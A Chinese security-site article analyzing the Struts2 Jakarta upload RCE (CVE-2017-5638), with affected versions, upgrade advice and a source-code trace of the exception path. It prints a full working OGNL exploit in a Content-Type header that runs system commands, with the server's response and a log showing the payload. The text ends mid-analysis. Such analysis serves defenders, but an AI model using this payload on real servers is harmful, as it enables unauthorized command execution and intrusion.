<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <title>深度剖析Struts2远程代码执行漏洞（CVE-2017-5638） - 嘶吼 RoarTalk &#8211; 回归最本质的信息安全,互联网安全新媒体,4hou.com</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="renderer" content="webkit">
    <meta property="wb:webmaster" content="4517e8fe39b18975" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1" />
    <meta name="description" content="三月初，安全研究人员发现世界上最流行的JavaWeb服务器框架之一-- Apache Struts2存在远程代码执行的漏洞，Struts2官方已经确认该漏洞（S2-046，CVE编号为：CVE-2017-5638）风险等级为高危漏洞。漏洞描述该漏洞是由…" />
    <meta name="keywords" content="Struts2, 远程代码执行漏洞" />
        <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon.ico" rel="shortcut icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_114.png" rel="apple-touch-icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_76.png" sizes="76x76" rel="apple-touch-icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_120.png" sizes="120x120" rel="apple-touch-icon">
    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_152.png" sizes="152x152" rel="apple-touch-icon">

    <!-- 引入 lib -->
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/jquery.min.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/swiper.jquery.min.js"></script>
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/swiper.min.css">
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/allmin.css">
    <!--[if lt IE 11]>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/html5shiv.min.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/respond.js"></script>
    <![endif]-->
    <!-- 引入 css js -->
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/css/style.css">
    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/allmin.css">
    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/public.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/main.js"></script>
    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/index-more.js"></script>
    </head>
<body>
<style type="text/css">
.memberlistanimate{width: 122px}
.memberlistanimateleave{width: 122px}
.nameheader{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width: 78px;display: block;}
</style>

<header class="header">
            <article class="header_center">
                <div class="logowrap">
            <a href="http://www.4hou.com"><div class="logo icons"></div></a>
            <h1>回归最本质的信息安全</h1>
        </div>
        <div class="login">
            <form action="/" class="navbar-form inSearch " name="searchform" onsubmit="return checksubmit()">
                <div class="br">
                    <span class="in-btn icons"></span>
                    <input type="text" name="s" id="search" class="animated">
                    <div class="clear icons"></div>
                </div>
                <div id="submitBtnplace" class="icons animated" value=""></div>
                <!--<input type="submit" id="submitBtn" class="icons animated" value="">-->
            </form>
                            <!--登录注册按钮-->
                 <div id="register">
                     <a href="http://www.4hou.com/register" data-event-category="Referral to Signup" data-event-action="click" data-event-label="Signup Menu button / Header">注册</a>
                 </div>
                 <div id="sing">
                      <a href="http://www.4hou.com/login" class="pzh_login">登录</a>
                 </div>

                 <div class="burger2 menu" id="burger">
                  <div class="icon"></div>
                 </div>

            
           <!-- <div id="register">注册</div>
            <div id="sing">登录</div>
            <div class="burger2 menu" id="burger">
                <div class="icon"></div>
            </div>-->
        </div>
    </article>
</header>
<nav class="navbox animated">
    <section class="navbox_cen">
        <article class="navboxleft">
            <ul class="nav navbar-nav index-nav" id="inNav">
					<li>
							<li class="cat-item cat-item-18"><a href="http://www.4hou.com/category/info" >资讯</a>
</li>
	<li class="cat-item cat-item-19"><a href="http://www.4hou.com/category/technology" >技术</a>
</li>
	<li class="cat-item cat-item-20"><a href="http://www.4hou.com/category/xactivity" >活动</a>
</li>
	<li class="cat-item cat-item-29"><a href="http://www.4hou.com/category/vulnerable" >漏洞</a>
</li>
					</li>
                    <li class="cat-item cat-item-29"><a href="http://www.4hou.com/piao" >嘶票</a>
                    </li>
            </ul>
        </article>
        <article class="navboxright">
            <div class="contrib"> <a href="http://www.4hou.com/contribute" class="tougao" data-event-category="Referral to Signup" data-event-action="click" data-event-label="Signup Menu button / Header">投稿</a></div>
        </article>
    </section>
</nav>
<div id="modelbg"></div>
    <style>


    ::selection {
    background:#fea283;
    color:#fff;
}
::-moz-selection {
    background:#fea283;
    color:#fff;
}
::-webkit-selection {
    background:#fea283;
    color:#fff;
}


        .article_cen p img{height: auto !important;}
        .commentlist .children{width: 90%; padding-right: 15px; border-color: transparent ;}
        .commentname,.commenteml{width: 60%; margin-left:5% ;margin-bottom: 30px;border-bottom: 1px solid #dbdbdb;}
        .article_cen ol li{list-style-type: decimal;}
         .article_cen ol li p{overflow: inherit;}
        .commentname label{font-size: 16px;color: #666; margin-right: 10px;line-height: 32px;}
        .commentname input{width: 50%;border: none; outline: none;}
        .commenteml label{font-size: 16px;color: #666; margin-right: 10px;line-height: 32px;}
        .commenteml input{width: 50%;border: none; outline: none;}
        #zooming{display: none;width: 100%;height: 100%; position: fixed;z-index: 999;left: 0px; top: 0px; background-color: rgba(0,0,0,.6);}
        .zoomaniatae{display: block !important;}
        .imgcon{}
        #imgcon{position: absolute;left: 50%; top: 20%;max-width: 80%}
        .article_cen img{cursor: pointer;}
        #zooming{cursor: pointer;}
        .imgconadimate{animation:imgcon 0.5s 1 forwards;
        -webkit-animation:imgcon 0.5s 1 forwards;}
        .article_authorbox{    width: 222px;min-height: 214px;
        padding-bottom: 20px;
        float: right;
        position: relative;}
        .interested{position: relative;}
        .interested>h1{font-size: 18px; font-weight: 900; position: absolute; top: -36px;color: #5e5e5e}
       .user-comment span{font-size: 13px; position: relative; top: 2px;}
        .article_authoradd{position: fixed;}
        .stratend{background:url(http://www.4hou.com/wp-content/themes/4houv2/img/starend.png); !important;background-size: contain !important;}
        .wpfp-span{opacity: 0;width:100%; height: 100%;display: block; left: 0px; top: 0px; }
        .wpfp-link{width:100%; height: 100%;display: block; left: 0px; top: 0px; }
        .wpfp-span img{display: none;}
        .interested{width: 222px;padding-bottom: 20px;background-color: #fff;margin-top: 70px; padding-bottom: 10px; padding-top: 10px;border: 1px solid #f5c2b1}
        .interested li{width: 100%;position: relative;padding-top: 8px; padding-bottom: 8px;  line-height: 24px; padding-left: 20px;padding-right: 14px}
        .interested li i{width: 6px;height: 6px;border-radius: 50%; background-color: #f63;position: absolute; left: 8px; top: 18px;}
        .interested li a{color: #666;font-size: 14px; line-height: 18px;}
        .interested li:hover{background-color: #f9e7e3;-moz-transition: all 0.4s ease-in-out;
        .footer{position: relative;z-index: 99}   
        .article_authorbox_top{position: relative;} 
        

        -o-transition: all 0.4s ease-in-out; -webkit-transition: all 0.4s ease-in-out; transition: all 0.4s ease-in-out;}
    
        @-webkit-keyframes imgcon{
            0%{ opacity:0; -webkit-transform:scale3d(.3, .3, .3); transform:scale3d(.3, .3, .3) }
            50%{ opacity:1 }
        }
        @keyframes imgcon{
            0%{ opacity:0; -webkit-transform:scale3d(.3, .3, .3); transform:scale3d(.3, .3, .3) }
            50%{ opacity:1 }
        }
        .asideanimate{animation:asideanimate 1s 1 forwards;
        -webkit-animation:asideanimate 1s 1 forwards; position: fixed;}
        @-webkit-keyframes asideanimate{
            0%{ opacity:0; -webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
            50%{ opacity:1 }
        }
        @keyframes asideanimate{
            0%{ opacity:0; -webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
            50%{ opacity:1 }
        }
        .asideanimateleave{animation:asideanimateleave 1s 1 forwards;
        -webkit-animation:asideanimateleave 1s 1 forwards;}
        @-webkit-keyframes asideanimateleave{
            0%{ opacity:1; -webkit-transform:translate3d(0,0, 0); transform:translate3d(0, 0, 0) }
            50%{ opacity:0;-webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
        }
        @keyframes asideanimateleave{
            0%{ opacity:1; -webkit-transform:translate3d(0,0, 0); transform:translate3d(0, 0, 0) }
            50%{ opacity:0;-webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
        }
        @media screen and (max-width:650px) {
            .member_list{right: -30px !important;top: 34px !important;}
            .article_authorbox{display: none;}
            .nameheader{display: none;}
            .shang_box{width: 90%; margin-left:-45% }
            #imgcon{width: 90% !important; margin-left: -45% !important;max-width: inherit !important}
            .dy{padding: 12px 15px!important;font-size: 14px !important; line-height: 22px !important;}
        }
        .article_author{float:none !important;padding-top: 1px;}
        .article_cen pre{color: #666 !important; line-height: 26px; background-color: #f1f1f1}
        .articlecontent blockquote>p{ color: #666; font-size: 16px; }
    </style>
    <section class="articlewrap">
        <article class="articlecontent">
            <div class="article_top">
                <h1 class="art_title">深度剖析Struts2远程代码执行漏洞（CVE-2017-5638）</h1>
                <p class="art_time">2017年4月6日发布</p>
                <div class="art_nav">
                    <!--<a href="">翻译文章</a>
                    <span>／</span>
                    <a href="">新闻</a>
                    <span>／</span>
                    <a href="">原创</a>-->
                                        <a href="http://www.4hou.com">首页 </a></a>
                    <span>／</span>
                    <a href="http://www.4hou.com/category/web">Web安全</a>
                    <span>／</span>
                    <a href="">正文</a>

                    </ul>
                </div>
                <div class="art_type">
                    <div class="newtype">
                        <div class="read ">
                            <i class="icons"></i>
                            <span>7,957</span>
                        </div>
                        <div class="comment ">
                            <i class="icons"></i>
                            <span>1</span>
                        </div>
                        <div class="Praise">
                            <i class="icons"></i>
                            <span>0</span>
                        </div>
                    </div>
                </div>
            </div>
             <p class="dy" style="padding: 24px 60px;font-size: 16px;line-height: 30px;color: #808080;background-color: #f6f6f6;"><span style="font-weight: bold;">导语：</span>三月初，安全研究人员发现世界上最流行的JavaWeb服务器框架之一-- Apache Struts2存在远程代码执行的漏洞，Struts2官方已经确认该漏洞（S2-046，CVE编号为：CVE-2017-5638）风险等级为高危漏洞。</p>

            <div class="article_cen">
                <!--文章摘要-->
               
                <p><p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170405/1491381735767698.jpg" title="1491381735767698.jpg" alt="u=4064301905,2173895604&amp;fm=11&amp;gp=0.jpg" /><noscript><img src="/uploads/20170405/1491381735767698.jpg" title="1491381735767698.jpg" alt="u=4064301905,2173895604&amp;fm=11&amp;gp=0.jpg" /></noscript></p>
<p>三月初，安全研究人员发现世界上最流行的JavaWeb服务器框架之一&#8211; Apache Struts2存在远程代码执行的漏洞，Struts2官方已经确认该漏洞（S2-046，CVE编号为：CVE-2017-5638）风险等级为高危漏洞。</p>
<p><span style="font-size: 20px"><strong>漏洞描述</strong></span></p>
<p>该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息，导致远程攻击者可通过修改HTTP请求头中的Content-Type值，构造发送恶意的数据包，利用该漏洞进而在受影响服务器上执行任意系统命令。&nbsp;</p>
<p><span style="font-size: 20px"><strong>漏洞利用条件和方式</strong></span></p>
<p>黑客通过Jakarta 文件上传插件实现远程利用该漏洞执行代码。</p>
<p><span style="font-size: 20px"><strong>漏洞影响范围</strong></span></p>
<pre class="brush:html;toolbar:false">Struts&nbsp;2.3.5&nbsp;-&nbsp;Struts&nbsp;2.3.31
Struts&nbsp;2.5&nbsp;-&nbsp;Struts&nbsp;2.5.10</pre>
<p>建议大家尽快升级到 Apache Struts 2.3.32 or 2.5.10.1&nbsp;</p>
<p>近日，我们对这个漏洞的执行代码进行了详细的分析，并对野外利用中的有效载荷进行了跟踪研究。除此之外，我们还提供了CVE-2017-5638运行的有效载荷，这是一个可以绕过只能检查请求内容类型的Web应用程序防火墙规则的备用漏洞利用向量。</p>
<p>对于不熟悉SSTI（服务端模板注入）概念的人员来说，这是一个注入攻击的典型例子。从模板引擎的原理可知，哪方实现的模板引擎，就依赖哪方。在server端实现模板引擎时，依赖server端。在客户端实现依赖客户端。</p>
<p>所以，只要在客户端实现一种模板解析方式（引擎），用来读取模板内容，分析并转为客户端可执行的程序源码，并运行，就可以脱离服务端，在浏览器端渲染页面，而不依赖服务端，这样的结果通常是模板引擎会允许任何形式的代码执行。对于许多流行的模板引擎，例如Freemarker，Smarty，Velocity，Jade等，通常可以在引擎之外执行远程代码执行（即产生系统shell）。在Struts的案例中，模板引擎就是使用诸如对象图导航语言（OGNL）的表达式语言来提供简单的模板功能。与OGNL的方法类似，模板引擎通常也可以在表达式语言之外获得远程代码执行。这些代码库提供了帮助缓解远程执行代码（如沙盒）的机制，但是默认情况下它们往往被禁用，或者简单地绕过。</p>
<p>从代码的角度来看，SSTI存在于应用程序中的最简单的条件是将用户输入传递到解析模板代码的函数中。将函数句柄值丢失是将各种注入漏洞引入到应用程序中的一种简单方法。要发现这样的漏洞，必须仔细追踪和分析调用堆栈和任何被感染的数据流。</p>
<p>这样才能充分了解CVE-2017-5638的工作原理，不过要真正了解漏洞的工作原理，我们还需要对库中的相关代码进行全面的分析。</p>
<p>我们通过捕获和记录CVE-2017-5638在运行时的异常代码进程，倒推出了次漏洞的工作原理。正如我们在下面的恶意代码再现中看到的那样，漏洞可以导致远程代码执行，在Apache公共上传库中parseRequest(request)解析出现异常，这是因为请求的内容类型与预期的有效字符串不匹配。我们还注意到，这个上传库引发的异常消息还包括HTTP请求中提供的无效内容类型头。这实际上是用用户输入来描述异常消息。</p>
<p>用户输入要求：</p>
<pre class="brush:html;toolbar:false;">POST&nbsp;/struts2-showcase/fileupload/doUpload.action&nbsp;HTTP/1.1
Host:&nbsp;localhost:8080
User-Agent:&nbsp;Mozilla/5.0&nbsp;(Macintosh;&nbsp;Intel&nbsp;Mac&nbsp;OS&nbsp;X&nbsp;10.12;&nbsp;rv:52.0)&nbsp;Gecko/20100101&nbsp;Firefox/52.0
Accept:&nbsp;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language:&nbsp;en-US,en;q=0.5
Accept-Encoding:&nbsp;gzip,&nbsp;deflate
Content-Type:&nbsp;${(#_=&#039;multipart/form-data&#039;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#039;com.opensymphony.xwork2.ActionContext.container&#039;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#039;whoami&#039;).(#iswin=(@java.lang.System@getProperty(&#039;os.name&#039;).toLowerCase().contains(&#039;win&#039;))).(#cmds=(#iswin?{&#039;cmd.exe&#039;,&#039;/c&#039;,#cmd}:{&#039;/bin/bash&#039;,&#039;-c&#039;,#cmd})).(#p=new&nbsp;java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Content-Length:&nbsp;0</pre>
<p>用户输入反应：</p>
<pre class="brush:html;toolbar:false;">HTTP/1.1&nbsp;200&nbsp;OK
Set-Cookie:&nbsp;JSESSIONID=16cuhw2qmanji1axbayhcp10kn;Path=/struts2-showcase
Expires:&nbsp;Thu,&nbsp;01&nbsp;Jan&nbsp;1970&nbsp;00:00:00&nbsp;GMT
Server:&nbsp;Jetty(8.1.16.v20140903)
Content-Length:&nbsp;11

testwebuser</pre>
<p>用户登录异常：</p>
<pre class="brush:html;toolbar:false;">2017-03-24&nbsp;13:44:39,625&nbsp;WARN&nbsp;&nbsp;[qtp373485230-21]&nbsp;multipart.JakartaMultiPartRequest&nbsp;(JakartaMultiPartRequest.java:69)&nbsp;-&nbsp;Request&nbsp;exceeded&nbsp;size&nbsp;limit!
org.apache.commons.fileupload.FileUploadBase$InvalidContentTypeException:&nbsp;the&nbsp;request&nbsp;doesn&#039;t&nbsp;contain&nbsp;a&nbsp;multipart/form-data&nbsp;or&nbsp;multipart/mixed&nbsp;stream,&nbsp;content&nbsp;type&nbsp;header&nbsp;is&nbsp;${(#_=&#039;multipart/form-data&#039;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#039;com.opensymphony.xwork2.ActionContext.container&#039;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#039;whoami&#039;).(#iswin=(@java.lang.System@getProperty(&#039;os.name&#039;).toLowerCase().contains(&#039;win&#039;))).(#cmds=(#iswin?{&#039;cmd.exe&#039;,&#039;/c&#039;,#cmd}:{&#039;/bin/bash&#039;,&#039;-c&#039;,#cmd})).(#p=new&nbsp;java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
	at&nbsp;org.apache.commons.fileupload.FileUploadBase$FileItemIteratorImpl.(FileUploadBase.java:948)&nbsp;~[commons-fileupload-1.3.2.jar:1.3.2]
	at&nbsp;org.apache.commons.fileupload.FileUploadBase.getItemIterator(FileUploadBase.java:310)&nbsp;~[commons-fileupload-1.3.2.jar:1.3.2]
	at&nbsp;org.apache.commons.fileupload.FileUploadBase.parseRequest(FileUploadBase.java:334)&nbsp;~[commons-fileupload-1.3.2.jar:1.3.2]
	at&nbsp;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.parseRequest(JakartaMultiPartRequest.java:147)&nbsp;~[struts2-core-2.5.10.jar:2.5.10]
	at&nbsp;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.processUpload(JakartaMultiPartRequest.java:91)&nbsp;~[struts2-core-2.5.10.jar:2.5.10]
	at&nbsp;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.parse(JakartaMultiPartRequest.java:67)&nbsp;[struts2-core-2.5.10.jar:2.5.10]
	at&nbsp;org.apache.struts2.dispatcher.multipart.MultiPartRequestWrapper.(MultiPartRequestWrapper.java:86)&nbsp;[struts2-core-2.5.10.jar:2.5.10]
	at&nbsp;org.apache.struts2.dispatcher.Dispatcher.wrapRequest(Dispatcher.java:806)&nbsp;[struts2-core-2.5.10.jar:2.5.10]
[..snip..]</pre>
<p>负责调用生成异常的parseRequest方法的调用者在一个名为JakartaMultiPartRequest的类中，JakartaMultiPartRequest作为围绕Apache commons fileupload库的包装器，定义了一个名为processUpload的方法，如下图所示，该方法在第91行调用了自己的parseRequest方法。该方法在第151行创建一个新的ServletFileUpload对象，并在第147行调用其parseRequest方法：</p>
<pre class="brush:html;toolbar:false;">core/src/main/java/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.java:90:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;void&nbsp;processUpload(HttpServletRequest&nbsp;request,&nbsp;String&nbsp;saveDir)&nbsp;throws&nbsp;FileUploadException,&nbsp;UnsupportedEncodingException&nbsp;{91:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(FileItem&nbsp;item&nbsp;:&nbsp;parseRequest(request,&nbsp;saveDir))&nbsp;{92:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOG.debug(&quot;Found&nbsp;file&nbsp;item:&nbsp;[{}]&quot;,&nbsp;item.getFieldName());93:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(item.isFormField())&nbsp;{94:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processNormalFormField(item,&nbsp;request.getCharacterEncoding());95:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{96:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processFileField(item);97:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}98:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}99:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}[..snip..]144:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;List&lt;FileItem&gt;&nbsp;parseRequest(HttpServletRequest&nbsp;servletRequest,&nbsp;String&nbsp;saveDir)&nbsp;throws&nbsp;FileUploadException&nbsp;{145:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DiskFileItemFactory&nbsp;fac&nbsp;=&nbsp;createDiskFileItemFactory(saveDir);146:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ServletFileUpload&nbsp;upload&nbsp;=&nbsp;createServletFileUpload(fac);147:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;upload.parseRequest(createRequestContext(servletRequest));148:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}149:&nbsp;150:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;ServletFileUpload&nbsp;createServletFileUpload(DiskFileItemFactory&nbsp;fac)&nbsp;{151:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ServletFileUpload&nbsp;upload&nbsp;=&nbsp;new&nbsp;ServletFileUpload(fac);152:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;upload.setSizeMax(maxSize);153:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;upload;154:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
<p>查看 Stacktrace（堆栈轨迹），Stacktrace是一个非常有用的调试工具. 在未捕获的异常被抛出时（或者手动制造堆栈跟踪的时候），它会让我们看到调到的堆（在某一点调用方法的堆)。不仅显示出出现错误的地方，也显出程序在那个地方是如何结束的。我们可以看到processUpload方法由JakartaMultiPartRequest在第67行的解析方法调用。如下图所示，调用此方法的任何抛出的异常都在第68行被捕获，并传递给buildErrorMessage。虽然根据引发的异常的类调用processUpload方法可以有多个选择，但最终都要调用buildErrorMessage方法。在这种情况下，第75行调用buildErrorMessage方法：</p>
<pre class="brush:html;toolbar:false;">core/src/main/java/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.java:64:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;void&nbsp;parse(HttpServletRequest&nbsp;request,&nbsp;String&nbsp;saveDir)&nbsp;throws&nbsp;IOException&nbsp;{65:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try&nbsp;{66:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setLocale(request);67:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;processUpload(request,&nbsp;saveDir);68:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;catch&nbsp;(FileUploadException&nbsp;e)&nbsp;{69:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOG.warn(&quot;Request&nbsp;exceeded&nbsp;size&nbsp;limit!&quot;,&nbsp;e);70:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LocalizedMessage&nbsp;errorMessage;71:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(e&nbsp;instanceof&nbsp;FileUploadBase.SizeLimitExceededException)&nbsp;{72:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileUploadBase.SizeLimitExceededException&nbsp;ex&nbsp;=&nbsp;(FileUploadBase.SizeLimitExceededException)&nbsp;e;73:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;errorMessage&nbsp;=&nbsp;buildErrorMessage(e,&nbsp;new&nbsp;Object[]{ex.getPermittedSize(),&nbsp;ex.getActualSize()});74:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{75:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;errorMessage&nbsp;=&nbsp;buildErrorMessage(e,&nbsp;new&nbsp;Object[]{});76:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}77:78:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!errors.contains(errorMessage))&nbsp;{79:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	errors.add(errorMessage);80:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}81:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;catch&nbsp;(Exception&nbsp;e)&nbsp;{82:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOG.warn(&quot;Unable&nbsp;to&nbsp;parse&nbsp;request&quot;,&nbsp;e);83:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LocalizedMessage&nbsp;errorMessage&nbsp;=&nbsp;buildErrorMessage(e,&nbsp;new&nbsp;Object[]{});84:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!errors.contains(errorMessage))&nbsp;{85:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;errors.add(errorMessage);86:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}87:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}88:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
<p>由于JakartaMultiPartRequest类没有定义buildErrorMessage方法，所以我们要查看它扩展的类：AbstractMultiPartRequest：</p>
<pre class="brush:html;toolbar:false;">core/src/main/java/org/apache/struts2/dispatcher/multipart/AbstractMultiPartRequest.java:98:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;protected&nbsp;LocalizedMessage&nbsp;buildErrorMessage(Throwable&nbsp;e,&nbsp;Object[]&nbsp;args)&nbsp;{99:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	String&nbsp;errorKey&nbsp;=&nbsp;&quot;struts.messages.upload.error.&quot;&nbsp;+&nbsp;e.getClass().getSimpleName();100:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	LOG.debug(&quot;Preparing&nbsp;error&nbsp;message&nbsp;for&nbsp;key:&nbsp;[{}]&quot;,&nbsp;errorKey);101:&nbsp;&nbsp;102:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;	return&nbsp;new&nbsp;LocalizedMessage(this.getClass(),&nbsp;errorKey,&nbsp;e.getMessage(),&nbsp;args);103:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre>
